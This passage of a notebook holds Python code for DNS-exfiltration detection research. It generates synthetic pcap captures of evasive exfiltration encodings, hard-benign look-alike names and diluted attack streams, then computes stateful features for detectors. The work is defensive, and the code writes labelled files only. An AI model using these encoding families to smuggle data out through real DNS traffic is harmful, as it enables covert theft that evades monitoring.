3. MIXED STREAMS         - one host's normal traffic with ONE attacker (one family, one attacker
   domain) diluted in at 1-50% of its queries, plus a clean reference stream (0%).
Pure evasive streams use three timings (fast 0.05 s, medium 0.5 s, slow 5 s mean gap), so a model
cannot rely on "fast = attack".

IMPORTANT: everything here is SYNTHETIC. The hard-benign patterns are approximations of real
naming schemes, not captured traffic; treat false-positive rates on them as indicative only.

    python src/evasion_data.py --out-dir data/processed/synth [--domains-file domains.txt]
"""

import argparse
import csv
import random
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from dns_simulator import DNSExfiltrationSimulator  # noqa: E402

QTYPES = {"A": 1, "NS": 2, "CNAME": 5, "NULL": 10, "PTR": 12, "MX": 15, "TXT": 16, "AAAA": 28, "HTTPS": 65}

# name: (encoding, max label length, sequence tag, qtype)
FAMILIES = {
    "b32_l63_seq":        ("base32", 63, True, "A"),
    "b32_l32_seq":        ("base32", 32, True, "A"),
    "b32_l16_seq":        ("base32", 16, True, "A"),
    "b32_l20_noseq":      ("base32", 20, False, "A"),
    "b32_l12_noseq_null": ("base32", 12, False, "NULL"),
    "b32_l32_txt":        ("base32", 32, True, "TXT"),
    "hex_l63_seq":        ("hex", 63, True, "A"),
    "hex_l32_noseq":      ("hex", 32, False, "AAAA"),
    "hex_l16_seq":        ("hex", 16, True, "A"),
    "b64_l63_txt":        ("base64", 63, True, "TXT"),
    "b64_l24_noseq":      ("base64", 24, False, "A"),
    "words":              ("words", 0, False, "A"),
}
ATTACKER_DOMAINS = ["cloud-sync.net", "upd-cdn.org", "telemetry-hub.com", "static-assets.io",
                    "mailgate.biz", "api-edge.co", "update.fast-dl.com", "sync.pixelhost.net"]
WORDS = ("amber apple arrow beach bell berry birch blue bone brave bread brick brook cabin candy cedar chair "
         "cliff cloud clover coast coral cotton crane daisy delta dune eagle ember fern field flame forest "
         "frost garden gold grain grape green harbor hazel honey iron island ivory jade lemon lilac maple "
         "meadow mint moon moss ocean olive pearl pine plum river rose sage sand silver stone sun tulip "
         "willow wind").split()
assert len(WORDS) >= 64
WORDS = WORDS[:64]

MIXED_FAMILIES = tuple(FAMILIES)                                  # every family is tested diluted
PURE_GAPS = (0.05, 0.5, 5.0)

FALLBACK_DOMAINS = ["wikipedia.org", "github.com", "bbc.co.uk", "nytimes.com", "stackoverflow.com", "reddit.com",
                    "amazon.com", "netflix.com", "apple.com", "microsoft.com", "yahoo.com", "ebay.com",
                    "cnn.com", "twitch.tv", "spotify.com", "dropbox.com", "slack.com", "zoom.us", "mozilla.org",
                    "adobe.com", "paypal.com", "linkedin.com", "weather.com", "imdb.com"]


# --------------------------------------------------------------------------- exfiltration
def _words_queries(n, domain, rng):
    out = []
    for _ in range(n):
        k = rng.randint(6, 9)
        out.append("-".join(rng.choice(WORDS) for _ in range(k)) + "." + domain)
    return out


def exfil_family(family, n, rng):
    """-> list of (qname, qtype_name) for one evasive exfiltration family."""
    enc, label_len, seq, qtype = FAMILIES[family]
    domain = rng.choice(ATTACKER_DOMAINS)
    if enc == "words":
        return [(q, qtype) for q in _words_queries(n, domain, rng)]
    sim = DNSExfiltrationSimulator(target_domain=domain, encoding=enc, max_label_length=label_len)
    qs = sim.generate_queries(rng.randbytes(n * label_len))[:n]
    if not seq:
        qs = [q.split(".", 1)[1] for q in qs]                   # drop the "sq0001" tag
    return [(q, qtype) for q in qs]


# --------------------------------------------------------------------------- hard benign
_B36 = "abcdefghijklmnopqrstuvwxyz0123456789"


def _b36(r, n):
    return "".join(r.choice(_B36) for _ in range(n))


def _hex(r, n):
    return "".join(r.choice("0123456789abcdef") for _ in range(n))


def _uuid(r):
    h = _hex(r, 32)
    return f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:]}"


def _case0x20(name, r):
    return "".join(c.upper() if (c.isalpha() and r.random() < 0.5) else c for c in name)


def hard_benign(n, rng, domains=None):
    """-> list of (qname, qtype_name) of legitimate names that resemble exfiltration."""
    domains = domains or FALLBACK_DOMAINS
    r = rng

    def dom():
        return r.choice(domains)

    patterns = [
        ("cloudfront", lambda: (f"d{_b36(r, 13)}.cloudfront.net", "A")),
        ("akamai", lambda: (f"e{r.randint(1000, 99999)}.dscb.akamaiedge.net", "A")),
        ("googlevideo", lambda: (f"r{r.randint(1, 9)}---sn-{_b36(r, 8)}.googlevideo.com", "A")),
        ("ec2", lambda: (f"ec2-{r.randint(1, 223)}-{r.randint(0, 255)}-{r.randint(0, 255)}-{r.randint(1, 254)}.compute-1.amazonaws.com", "A")),
        ("execute-api", lambda: (f"{_b36(r, 10)}.execute-api.us-east-1.amazonaws.com", "A")),
        ("azure-blob", lambda: (f"{_b36(r, 24)}.blob.core.windows.net", "A")),
        ("azure-app", lambda: (f"{_b36(r, 12)}.cloudapp.azure.com", "AAAA")),
        ("sentry", lambda: (f"o{r.randint(100000, 999999)}.ingest.sentry.io", "A")),
        ("telemetry-guid", lambda: (f"{_uuid(r)}.events.data.microsoft.com", "A")),
        ("hash-reputation", lambda: (f"{_hex(r, 40)}.rep.example-av.net", "A")),
        ("cdn-hash-sub", lambda: (f"{_hex(r, 16)}.{dom()}", "A")),
        ("dkim", lambda: (f"s{r.randint(1, 2)}._domainkey.{dom()}", "TXT")),
        ("dnsbl", lambda: (f"{r.randint(1, 254)}.{r.randint(0, 255)}.{r.randint(0, 255)}.{r.randint(1, 254)}.zen.spamhaus.org", "A")),
        ("ptr", lambda: (f"{r.randint(1, 254)}.{r.randint(0, 255)}.{r.randint(0, 255)}.{r.randint(1, 254)}.in-addr.arpa", "PTR")),
        ("case0x20", lambda: (_case0x20(("www." if r.random() < 0.6 else "") + dom(), r), "A")),
        ("punycode", lambda: (f"xn--{_b36(r, 8)}-{_b36(r, 3)}.com", "A")),
        ("hyphen-words", lambda: ("-".join(r.choice(WORDS) for _ in range(r.randint(3, 5))) + "." + dom(), "A")),
        ("tracking", lambda: (f"{_b36(r, 20)}.click.{dom()}", "A")),
    ]
    return [patterns[r.randrange(len(patterns))][1]() for _ in range(n)]


def plain_benign(n, rng, domains=None):
    domains = domains or FALLBACK_DOMAINS
    return [((rng.choice(["www.", "", "cdn.", "mail.", "api."]) + rng.choice(domains)), rng.choice(["A", "A", "A", "AAAA"]))
            for _ in range(n)]


# --------------------------------------------------------------------------- pcap writing
def _dns_wire(name, qtype):
    labels = name.split(".")
    assert all(0 < len(l) <= 63 for l in labels) and len(name) <= 253, f"invalid DNS name: {name!r}"
    wire = b"".join(bytes([len(l)]) + l.encode("ascii") for l in labels) + b"\x00"
    return struct.pack("!HHHHHH", random.getrandbits(16), 0x0100, 1, 0, 0, 0) + wire + struct.pack("!HH", QTYPES[qtype], 1)


def _frame(payload, src_ip):
    udp = struct.pack("!HHHH", random.randint(1025, 65000), 53, 8 + len(payload), 0) + payload
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(udp), random.getrandbits(16), 0, 64, 17, 0,
                     bytes(src_ip), bytes([8, 8, 8, 8])) + udp
    return b"\xaa" * 6 + b"\xbb" * 6 + b"\x08\x00" + ip


def write_stream(path, events, src_ip=(192, 168, 50, 10), snaplen=96):
    """events: list of (ts, name, qtype_name, label, family). Writes path (.pcap) and path.labels.csv."""
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    events = sorted(events, key=lambda e: e[0])
    out = bytearray(b"\xd4\xc3\xb2\xa1" + struct.pack("<HHiIII", 2, 4, 0, 0, snaplen, 1))
    for ts, name, qtype, _label, _fam in events:
        fr = _frame(_dns_wire(name, qtype), src_ip)
        cap = fr[:snaplen]
        out += struct.pack("<IIII", int(ts), int((ts % 1) * 1e6), len(cap), len(fr)) + cap
    path.write_bytes(bytes(out))
    with open(path.with_suffix(".labels.csv"), "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["pkt_index", "label", "family", "name", "qtype"])
        for i, (_ts, name, qtype, label, fam) in enumerate(events):
            w.writerow([i, label, fam, name, qtype])
    return path


def _timeline(n, mean_gap, rng, t0=1_700_000_000.0):
    t, out = t0, []
    for _ in range(n):
        t += rng.expovariate(1.0 / mean_gap)
        out.append(t)
    return out


# --------------------------------------------------------------------------- generate
def generate(out_dir, domains=None, seed=7, n_family=1500, n_hard=8000, n_mixed=6000,
             mixed_rates=(0.01, 0.05, 0.2, 0.5), mixed_families=MIXED_FAMILIES, snaplen=96,
             train_mixed_rates=(0.05, 0.2), n_train_mixed=3000):
    """Write all synthetic captures under out_dir. Returns a list of manifest dicts
    (kind, file, family, rate, mean_gap, queries, exfil).

    kind = evasive | hard_benign | mixed (test streams) | train_mixed (diluted streams for EVERY
    family, meant for augmented training; generated last so the test streams do not depend on them)."""
    rng = random.Random(seed)
    random.seed(seed)
    out, manifest = Path(out_dir), []
    domains = domains or FALLBACK_DOMAINS

    def add(kind, path, events, family="", rate=0.0, gap=0.0):
        write_stream(path, events, src_ip=(192, 168, 50, 10 + len(manifest) % 240), snaplen=snaplen)
        manifest.append({"kind": kind, "file": Path(path).name, "family": family, "rate": rate, "mean_gap": gap,
                         "queries": len(events), "exfil": sum(e[3] for e in events)})

    for k, fam in enumerate(FAMILIES):                           # pure evasive streams, varied timing
        gap = PURE_GAPS[k % len(PURE_GAPS)]
        qs = exfil_family(fam, n_family, rng)
        ts = _timeline(len(qs), gap, rng)
        add("evasive", out / "evasive" / f"ev_{fam}.pcap", [(t, q, qt, 1, fam) for t, (q, qt) in zip(ts, qs)], fam, 1.0, gap)

    hb = hard_benign(n_hard, rng, domains)                       # hard benign only
    ts = _timeline(len(hb), 0.5, rng)
    add("hard_benign", out / "hardneg" / "hard_benign.pcap",
        [(t, q, qt, 0, "hard_benign") for t, (q, qt) in zip(ts, hb)], "hard_benign", 0.0, 0.5)

    def background(n):
        plain, hard = plain_benign(n, rng, domains), hard_benign(n, rng, domains)
        return [hard[i] if rng.random() < 0.3 else plain[i] for i in range(n)]

    ts = _timeline(n_mixed, 0.5, rng)                            # clean reference stream (rate 0)
    add("mixed", out / "mixed" / "mixed_none_r00.pcap",
        [(t, q, qt, 0, "background") for t, (q, qt) in zip(ts, background(n_mixed))], "none", 0.0, 0.5)

    def mixed_events(fam, rate, n):
        ts, bg = _timeline(n, 0.5, rng), background(n)
        pool = exfil_family(fam, int(n * rate * 1.5) + 10, rng)       # one call = one attacker domain
        events = []
        for i, t in enumerate(ts):
            if rng.random() < rate and pool:
                q, qt = pool.pop(0)
                events.append((t, q, qt, 1, fam))
            else:
                q, qt = bg[i]
                events.append((t, q, qt, 0, "background"))
        return events

    for fam in mixed_families:                                   # one attacker per stream
        for rate in mixed_rates:
            add("mixed", out / "mixed" / f"mixed_{fam}_r{int(round(rate * 100)):02d}.pcap",
                mixed_events(fam, rate, n_mixed), fam, rate, 0.5)

    for fam in FAMILIES:                                         # training-only diluted streams
        for rate in train_mixed_rates:
            add("train_mixed", out / "train_mixed" / f"trainmix_{fam}_r{int(round(rate * 100)):02d}.pcap",
                mixed_events(fam, rate, n_train_mixed), fam, rate, 0.5)
    return manifest


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out-dir", default="data/processed/synth")
    ap.add_argument("--domains-file", help="text file with one benign base domain per line")
    ap.add_argument("--seed", type=int, default=7)
    ap.add_argument("--snaplen", type=int, default=96, help="96 mimics the real captures; 65535 = full packets")
    a = ap.parse_args()
    doms = [l.strip() for l in open(a.domains_file)] if a.domains_file else None
    for m in generate(a.out_dir, doms, a.seed, snaplen=a.snaplen):
        print(f"  {m['kind']:12s} {m['file']:34s} queries {m['queries']:>6,} exfil {m['exfil']:>6,}")
    print(f"[OK] wrote captures + .labels.csv sidecars to {a.out_dir}")


if __name__ == "__main__":
    sys.exit(main())

In [ ]:
%%writefile stateful_features.py
"""
Stateful (temporal + per-domain statistical) features for DNS queries
=====================================================================
Every feature is CAUSAL: it is computed from the current query and the traffic that came
BEFORE it from the same host (and to the same base domain), exactly what a streaming detector
could compute at that moment. Nothing looks into the future, so a time-ordered train/test split
stays clean.

Step 1 - host temporal features, over the host's last `host_n` queries (paper: tau = 100):
    h_n                 queries in the window
    h_rate              queries per second
    h_gap_mean, h_gap_cv  mean inter-arrival time and its coefficient of variation (regularity)
    h_unique_name_ratio   distinct names / queries
    h_unique_base_ratio   distinct base domains / queries
    h_len_mean, h_len_std true DNS message length
    h_entropy_mean        mean name entropy

Step 2 - per-domain statistical features, over the last `dom_seconds` of traffic from the same
host to the same base domain (the domain is "<trunc>" when the capture cut the name, so long
truncated queries of one host fall back to one shared bucket):
    d_n, d_unique_sub, d_unique_ratio   volume and subdomain diversity
    d_sub_len_mean, d_sub_len_std       subdomain length
    d_sub_entropy_mean                  subdomain entropy
    d_gap_mean                          mean inter-arrival time to this domain
    d_share                             share of the host's queries (same time span) going here
    d_bytes                             total DNS bytes sent to this domain

Step 3 helper - add_rolling_scores(): host / domain rolling mean (and domain max) of a per-query
score, used by the two-layer model.

Step 4 - add_behaviour(): content-agnostic behaviour of a host -> domain pair over a long horizon
(`long_seconds`, default 1 h) and over the whole history. No character statistics at all, so a model
on these features cannot take the "looks random" shortcut:
    dl_n, dl_unique_sub, dl_unique_ratio   volume and subdomain diversity over the long horizon
    dl_bytes_rate                          DNS bytes per second sent to the domain (long horizon)
    dl_gap_cv                              regularity of queries to the domain (long horizon)
    d_new_frac                             share of recent queries that used a never-seen subdomain
    d_cum_unique                           log(1 + distinct subdomains ever sent to the domain)
"""

import math
from collections import Counter, deque

import numpy as np
import pandas as pd

import pcap_features as pf

HOST_FEATURES = ["h_n", "h_rate", "h_gap_mean", "h_gap_cv", "h_unique_name_ratio", "h_unique_base_ratio",
                 "h_len_mean", "h_len_std", "h_entropy_mean"]
DOMAIN_FEATURES = ["d_n", "d_unique_sub", "d_unique_ratio", "d_sub_len_mean", "d_sub_len_std",
                   "d_sub_entropy_mean", "d_gap_mean", "d_share", "d_bytes"]
SCORE_FEATURES = ["h_score_mean", "d_score_mean", "d_score_max"]
BEHAVIOUR_FEATURES = ["dl_n", "dl_unique_sub", "dl_unique_ratio", "dl_bytes_rate", "dl_gap_cv",
                      "d_new_frac", "d_cum_unique"]
KEYS = ("scenario", "file", "src")


def base_and_sub(name, complete):
    """-> (base domain, subdomain), both lower-case (DNS is case-insensitive; 0x20 randomisation)."""
    name = (name or "").lower()
    if not complete:
        return "<trunc>", name
    labels = name.split(".") if name else []
    _sld, sub, _has = pf.split_name(labels, True)
    return (name[len(sub) + 1:] if sub else name), sub


def _order(df, keys):
    g = df.groupby(list(keys), sort=False, dropna=False).ngroup().to_numpy()
    return g, np.lexsort((df["ts"].to_numpy(float), g))


def _std(s, s2, n):
    return math.sqrt(max(s2 / n - (s / n) ** 2, 0.0)) if n else 0.0


def add_stateful(df, host_n=100, dom_seconds=600.0, keys=KEYS):
    """Return a copy of df with `base`, `sub` and the HOST_FEATURES + DOMAIN_FEATURES columns.
    Needs columns: keys, ts, dns_len, entropy, name, name_complete."""
    df = df.copy()
    bs = [base_and_sub(n, c) for n, c in zip(df["name"].fillna("").astype(str), df["name_complete"].astype(int))]
    df["base"] = [b for b, _ in bs]
    df["sub"] = [s for _, s in bs]
    n_rows = len(df)
    out = {c: np.zeros(n_rows) for c in HOST_FEATURES + DOMAIN_FEATURES}
    ts, ln, ent = (df["ts"].to_numpy(float), df["dns_len"].to_numpy(float), df["entropy"].to_numpy(float))
    names = [s.lower() for s in df["name"].fillna("").astype(str)]
    base, sub = df["base"].to_numpy(), df["sub"].to_numpy()
    sub_len = np.array([len(s) for s in sub], dtype=float)
    sub_ent = np.array([pf.shannon(s) for s in sub], dtype=float)
    grp, order = _order(df, keys)

    cur = None
    for i in order:
        if grp[i] != cur:                                    # new host stream: reset all state
            cur = grp[i]
            hq = deque()                                     # (ts, len, ent, name, base)
            h = {"len": 0.0, "len2": 0.0, "ent": 0.0, "gap": 0.0, "gap2": 0.0}
            hgaps, hnames, hbases = deque(), Counter(), Counter()
            htime = deque()                                  # host timestamps within dom_seconds
            doms = {}
        t = ts[i]
        # ---------------- host window (last host_n queries)
        if hq:
            g = t - hq[-1][0]
            hgaps.append(g); h["gap"] += g; h["gap2"] += g * g
        hq.append((t, ln[i], ent[i], names[i], base[i]))
        h["len"] += ln[i]; h["len2"] += ln[i] ** 2; h["ent"] += ent[i]
        hnames[names[i]] += 1; hbases[base[i]] += 1
        if len(hq) > host_n:
            _t, l0, e0, n0, b0 = hq.popleft()
            h["len"] -= l0; h["len2"] -= l0 ** 2; h["ent"] -= e0
            hnames[n0] -= 1
            if not hnames[n0]: del hnames[n0]
            hbases[b0] -= 1
            if not hbases[b0]: del hbases[b0]
            g0 = hgaps.popleft(); h["gap"] -= g0; h["gap2"] -= g0 * g0
        n = len(hq)
        span = hq[-1][0] - hq[0][0]
        ng = len(hgaps)
        gmean = h["gap"] / ng if ng else dom_seconds
        out["h_n"][i] = n
        out["h_rate"][i] = (n - 1) / span if span > 0 else 0.0
        out["h_gap_mean"][i] = gmean
        out["h_gap_cv"][i] = _std(h["gap"], h["gap2"], ng) / gmean if ng and gmean > 0 else 0.0
        out["h_unique_name_ratio"][i] = len(hnames) / n
        out["h_unique_base_ratio"][i] = len(hbases) / n
        out["h_len_mean"][i] = h["len"] / n
        out["h_len_std"][i] = _std(h["len"], h["len2"], n)
        out["h_entropy_mean"][i] = h["ent"] / n
        # ---------------- host time window (for d_share)
        htime.append(t)
        while htime[0] < t - dom_seconds:
            htime.popleft()
        # ---------------- domain window (last dom_seconds to the same base)
        d = doms.get(base[i])
        if d is None:
            d = doms[base[i]] = {"q": deque(), "subs": Counter(), "sl": 0.0, "sl2": 0.0, "se": 0.0, "by": 0.0}
        q = d["q"]
        while q and q[0][0] < t - dom_seconds:
            _t, s0, l0, e0, b0 = q.popleft()
            d["subs"][s0] -= 1
            if not d["subs"][s0]: del d["subs"][s0]
            d["sl"] -= l0; d["sl2"] -= l0 ** 2; d["se"] -= e0; d["by"] -= b0
        q.append((t, sub[i], sub_len[i], sub_ent[i], ln[i]))
        d["subs"][sub[i]] += 1
        d["sl"] += sub_len[i]; d["sl2"] += sub_len[i] ** 2; d["se"] += sub_ent[i]; d["by"] += ln[i]
        dn = len(q)
        out["d_n"][i] = dn
        out["d_unique_sub"][i] = len(d["subs"])
        out["d_unique_ratio"][i] = len(d["subs"]) / dn
        out["d_sub_len_mean"][i] = d["sl"] / dn
        out["d_sub_len_std"][i] = _std(d["sl"], d["sl2"], dn)
        out["d_sub_entropy_mean"][i] = d["se"] / dn
        out["d_gap_mean"][i] = (t - q[0][0]) / (dn - 1) if dn > 1 else dom_seconds
        out["d_share"][i] = dn / len(htime)
        out["d_bytes"][i] = d["by"]
    for c, v in out.items():
        df[c] = v
    return df


def add_rolling_scores(df, score_col, host_n=100, dom_seconds=600.0, keys=KEYS):
    """Causal host / domain aggregates of a per-query score (two-layer model). Needs `base`."""
    s = df[score_col].to_numpy(float)
    ts, base = df["ts"].to_numpy(float), df["base"].to_numpy()
    res = {c: np.zeros(len(df)) for c in SCORE_FEATURES}
    grp, order = _order(df, keys)
    cur = None
    for i in order:
        if grp[i] != cur:
            cur, hq, hsum, doms = grp[i], deque(), 0.0, {}
        hq.append(s[i]); hsum += s[i]
        if len(hq) > host_n:
            hsum -= hq.popleft()
        res["h_score_mean"][i] = hsum / len(hq)
        d = doms.setdefault(base[i], deque())
        while d and d[0][0] < ts[i] - dom_seconds:
            d.popleft()
        d.append((ts[i], s[i]))
        vals = [v for _, v in d]
        res["d_score_mean"][i] = sum(vals) / len(vals)
        res["d_score_max"][i] = max(vals)
    out = df.copy()
    for c, v in res.items():
        out[c] = v
    return out


def add_behaviour(df, long_seconds=3600.0, keys=KEYS):
    """Causal long-horizon behaviour per host -> base domain (needs `base` and `sub` from add_stateful)."""
    ts, ln = df["ts"].to_numpy(float), df["dns_len"].to_numpy(float)
    base, sub = df["base"].to_numpy(), df["sub"].to_numpy()
    res = {c: np.zeros(len(df)) for c in BEHAVIOUR_FEATURES}
    grp, order = _order(df, keys)
    cur = None
    for i in order:
        if grp[i] != cur:
            cur, doms = grp[i], {}
        t = ts[i]
        d = doms.get(base[i])
        if d is None:
            d = doms[base[i]] = {"q": deque(), "subs": Counter(), "by": 0.0, "g": 0.0, "g2": 0.0, "ng": 0,
                                 "new": 0, "seen": set(), "last": None}
        q = d["q"]
        while q and q[0][0] < t - long_seconds:
            _t, s0, l0, g0, n0 = q.popleft()
            d["subs"][s0] -= 1
            if not d["subs"][s0]:
                del d["subs"][s0]
            d["by"] -= l0
            d["new"] -= n0
            if g0 is not None:
                d["g"] -= g0; d["g2"] -= g0 * g0; d["ng"] -= 1
        gap = None if d["last"] is None else t - d["last"]
        d["last"] = t
        is_new = int(sub[i] not in d["seen"])
        d["seen"].add(sub[i])
        q.append((t, sub[i], ln[i], gap, is_new))
        d["subs"][sub[i]] += 1
        d["by"] += ln[i]
        d["new"] += is_new
        if gap is not None:
            d["g"] += gap; d["g2"] += gap * gap; d["ng"] += 1
        n = len(q)
        res["dl_n"][i] = n
        res["dl_unique_sub"][i] = len(d["subs"])
        res["dl_unique_ratio"][i] = len(d["subs"]) / n
        res["dl_bytes_rate"][i] = d["by"] / long_seconds
        gm = d["g"] / d["ng"] if d["ng"] else 0.0
        res["dl_gap_cv"][i] = _std(d["g"], d["g2"], d["ng"]) / gm if d["ng"] and gm > 0 else 0.0
        res["d_new_frac"][i] = d["new"] / n
        res["d_cum_unique"][i] = math.log1p(len(d["seen"]))
    out = df.copy()
    for c, v in res.items():
        out[c] = v
    return out


def demo():
    """Tiny worked example (also used by the tests)."""
    rows = []
    for k in range(5):                                       # one host: 5 lookups of one site, 5 exfil chunks
        rows.append(dict(scenario="x", file="f", src="h", ts=float(k), dns_len=40, entropy=2.5,
                         name="www.example.com", name_complete=1))
        rows.append(dict(scenario="x", file="f", src="h", ts=k + 0.5, dns_len=80, entropy=4.0,
                         name=f"a{k}x9q2z7k.evil.net", name_complete=1))
    return add_stateful(pd.DataFrame(rows), host_n=4, dom_seconds=10)

In [ ]:
%%writefile experiment.py
"""
Shared experiment pipeline for notebooks 02-05
=============================================
One place that builds the data, the splits, the detectors and the metrics, so the baseline and
every improvement step are evaluated on IDENTICAL data with IDENTICAL metrics.

Data (prepare):
    real       CIC-Bell-DNS-EXF-2021 PCAPs -> pcap_features (labels by query shape)
               split per capture by time: first 70% = real_train, last 30% = real_test
    synthetic  evasion_data: 12 evasive families (pure streams, varied timing), hard-benign
               stream (first half = hard_train, second half = hard_test), mixed streams
               (one attacker diluted into normal traffic at 1/5/20/50%, plus a clean stream),
               train-only mixed streams for every family (5/20%) used by the augmented steps

Detectors (run_detectors):
    baseline          paper's 14 stateless features, trained on real_train      (any model)
    baseline+window   baseline RF + the paper's window rule (flag window if > 40% flagged)
    step1             + host temporal features                                  (real_train)
    step2             + per-domain statistical features                         (real_train)
    step3a            step2 features + augmented training with synthetic families (pure AND diluted
                      streams) and hard negatives, evaluated leave-one-encoding-out
    step3b            two-layer: char-model query classifier -> host/domain score aggregates
                      + step2 features, same augmentation and leave-one-encoding-out
    step4 behaviour   content-agnostic model: per-domain volume / diversity / novelty / timing /
                      bytes over 10 min and 1 h, NO character features; augmented, leave-one-encoding-out.
                      It ABSTAINS on names the capture cut off (base "<trunc>"): their domain is unknown,
                      so all of a host's long names share one bucket and look like one busy attacker
                      domain (cfg behaviour_on_trunc=True disables this).
    step4             step3a OR step4 behaviour (flag a query if either model flags it)

Every detector returns one score in [0, 1] per TEST query. For leave-one-encoding-out models a
query that belongs to no encoding (real_test, hard_test, clean stream) gets the mean over the
four fold models, so its false-positive rate is the average over folds.

Metrics (evaluate): query-level recall / FPR / F1 on each test set, recall per encoding and per
dilution rate. Everything is in percent.
"""

import glob
import hashlib
import json
import math
import shutil
import time
from collections import Counter
from pathlib import Path

import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from sklearn.linear_model import LogisticRegression
from sklearn.model_selection import StratifiedKFold, cross_val_predict
from sklearn.naive_bayes import GaussianNB
from sklearn.neural_network import MLPClassifier
from sklearn.pipeline import make_pipeline
from sklearn.preprocessing import StandardScaler
from sklearn.svm import SVC

import evasion_data as ev
import pcap_features as pf
import stateful_features as sf

DEFAULTS = dict(seed=42, window=100, dom_seconds=600.0, train_frac=0.7,
                n_family=1500, n_hard=8000, n_mixed=5000, mixed_rates=(0.01, 0.05, 0.2, 0.5),
                mixed_families=ev.MIXED_FAMILIES, snaplen=96, train_mixed_rates=(0.05, 0.2), n_train_mixed=3000,
                svm_max_train=10_000, n_estimators=100,
                paper_delta=0.4, long_seconds=3600.0, behaviour_on_trunc=False)

PAPER14 = ["FQDN_count", "subdomain_length", "upper", "lower", "numeric", "entropy", "special", "labels",
           "labels_max", "labels_average", "longest_word", "sld_code", "len", "subdomain"]
CHAR = ["entropy", "upper_ratio", "lower_ratio", "digit_ratio", "special_ratio", "vowel_ratio", "unique_char_ratio",
        "longest_word", "first_label_numeric", "ll_all", "ll_long", "long_len", "long_entropy", "hex_frac_long",
        "trans_long", "digit_frac_long"]
FEATURES = {
    "baseline": PAPER14,
    "step1": PAPER14 + sf.HOST_FEATURES,
    "step2": PAPER14 + sf.HOST_FEATURES + sf.DOMAIN_FEATURES,
    "step3_layer1": CHAR,
    "step3_layer2": PAPER14 + sf.HOST_FEATURES + sf.DOMAIN_FEATURES + ["l1_score"] + sf.SCORE_FEATURES,
    # behaviour only: no per-query lexical features, no subdomain length / entropy, no host features
    "step4_behaviour": ["d_n", "d_unique_sub", "d_unique_ratio", "d_gap_mean", "d_share", "d_bytes"]
                       + sf.BEHAVIOUR_FEATURES,
}
ENCODINGS = ["base32", "hex", "base64", "words"]
TEST_ROLES = ["real_test", "evasive", "hard_test", "mixed"]
KEYS = list(sf.KEYS)


# --------------------------------------------------------------------------- character model
_ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789-_."
_IDX = {c: i for i, c in enumerate(_ALPHA)}
_K = len(_ALPHA) + 1


def _enc(s):
    return [_IDX.get(c, _K - 1) for c in s.lower()]


def train_bigram_lm(names):
    cnt = np.ones((_K, _K))
    for n in names:
        e = _enc(n)
        for a, b in zip(e, e[1:]):
            cnt[a, b] += 1
    return np.log(cnt / cnt.sum(1, keepdims=True))


def char_features(df, lm):
    def ll(s):
        e = _enc(s)
        return float(np.mean([lm[a, b] for a, b in zip(e, e[1:])])) if len(e) > 1 else 0.0
    cls = lambda c: 0 if c.isdigit() else 1 if c.isalpha() else 2
    rows = []
    for n in df["name"].fillna("").astype(str):
        labs = [l for l in n.split(".") if l] or [""]
        L = max(labs, key=len)
        m = max(len(L), 1)
        rows.append((ll(n), ll(L), len(L), pf.shannon(L), sum(c in "0123456789abcdefABCDEF" for c in L) / m,
                     sum(cls(a) != cls(b) for a, b in zip(L, L[1:])) / max(len(L) - 1, 1),
                     sum(c.isdigit() for c in L) / m))
    cols = ["ll_all", "ll_long", "long_len", "long_entropy", "hex_frac_long", "trans_long", "digit_frac_long"]
    return pd.DataFrame(rows, columns=cols, index=df.index)


# --------------------------------------------------------------------------- data
def _fingerprint(inputs, cfg):
    parts = [json.dumps({k: (list(v) if isinstance(v, tuple) else v) for k, v in sorted(cfg.items())}, default=str)]
    for i in inputs:
        p = Path(i)
        files = sorted(p.rglob("*")) if p.is_dir() else [p]
        parts += [f"{f.name}:{f.stat().st_size}" for f in files if f.is_file()]
    return hashlib.sha1("|".join(parts).encode()).hexdigest()


def prepare(inputs, work_dir, cfg=None, verbose=True, use_cache=True, keep_synthetic=True):
    """Build the full dataset. Returns dict(ALL=DataFrame, manifest=DataFrame, real_audit=DataFrame, cfg=dict).
    keep_synthetic=False deletes the generated synthetic PCAPs once their features are extracted."""
    cfg = {**DEFAULTS, **(cfg or {})}
    work = Path(work_dir)
    work.mkdir(parents=True, exist_ok=True)
    key = _fingerprint(inputs, cfg)
    cache = work / "prepared.pkl"
    if use_cache and cache.exists():
        D = pd.read_pickle(cache)
        if D.get("key") == key:
            if verbose:
                print(f"[cache] loaded prepared data from {cache}")
            return D
    t0 = time.time()

    # ---- real captures
    if verbose:
        print("Extracting real PCAPs ...")
    pf.run(inputs, out_dir=work / "real", window=cfg["window"], verbose=verbose)
    Q = pd.read_csv(work / "real" / "queries.csv", low_memory=False)
    real_audit = pd.read_csv(work / "real" / "label_audit.csv")
    Q = Q.sort_values(["scenario", "file", "ts"]).reset_index(drop=True)
    pos = Q.groupby(["scenario", "file"]).cumcount() / Q.groupby(["scenario", "file"])["ts"].transform("size")
    Q["role"] = np.where(pos < cfg["train_frac"], "real_train", "real_test")
    Q["origin"], Q["enc"], Q["rate"] = "real", "real", np.nan
    Q["family"] = np.where(Q.label == 1, "real_exfil", "real_benign")
    Q["stream_family"] = "real"

    # ---- synthetic captures
    ben = Q[(Q.label == 0) & (Q.name_complete == 1) & (Q.role == "real_train")].name.dropna()
    domains = sorted({".".join(n.split(".")[-2:]).lower() for n in ben
                      if len(n.split(".")) >= 2 and "arpa" not in n and len(n) < 40})
    syn_dir = work / "synthetic"
    shutil.rmtree(syn_dir, ignore_errors=True)
    if verbose:
        print(f"Generating synthetic traffic ({len(domains):,} benign base domains from the real capture) ...")
    man = pd.DataFrame(ev.generate(syn_dir, domains or None, seed=cfg["seed"], n_family=cfg["n_family"],
                                   n_hard=cfg["n_hard"], n_mixed=cfg["n_mixed"], mixed_rates=cfg["mixed_rates"],
                                   mixed_families=cfg["mixed_families"], snaplen=cfg["snaplen"],
                                   train_mixed_rates=cfg["train_mixed_rates"], n_train_mixed=cfg["n_train_mixed"]))
